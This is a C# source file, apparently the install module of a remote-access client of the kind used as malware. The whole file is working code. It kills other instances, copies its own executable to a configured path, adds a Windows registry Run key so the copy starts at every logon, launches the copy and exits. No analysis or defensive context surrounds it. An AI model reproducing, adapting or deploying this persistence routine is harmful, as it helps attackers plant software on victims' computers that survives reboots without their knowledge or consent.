using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;

namespace Client.Install
{
    class NormalStartup
    {
        public static void Install()
        {
            try
            {
                if (Process.GetCurrentProcess().MainModule.FileName != Settings.ClientFullPath)
                {
                    foreach (Process P in Process.GetProcesses())
                    {
                        try
                        {
                            if (P.MainModule.FileName == Settings.ClientFullPath)
                                P.Kill();
                        }
                        catch
                        {
                            Debug.WriteLine("NormalStartup Error : " + P.ProcessName);
                        }
                    }

                    FileStream Drop;
                    if (File.Exists(Settings.ClientFullPath))
                        Drop = new FileStream(Settings.ClientFullPath, FileMode.Create);
                    else
                        Drop = new FileStream(Settings.ClientFullPath, FileMode.CreateNew);
                    byte[] Client = File.ReadAllBytes(Process.GetCurrentProcess().MainModule.FileName);
                    Drop.Write(Client, 0, Client.Length);
                    Drop.Dispose();

                    Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run\").SetValue(Path.GetFileName(Settings.ClientFullPath), Settings.ClientFullPath);
                    Process.Start(Settings.ClientFullPath);
                    Environment.Exit(0);
                }
            }
            catch (Exception ex)
            {
                Debug.WriteLine("Install Failed : " + ex.Message);
            }
        }

    }
}
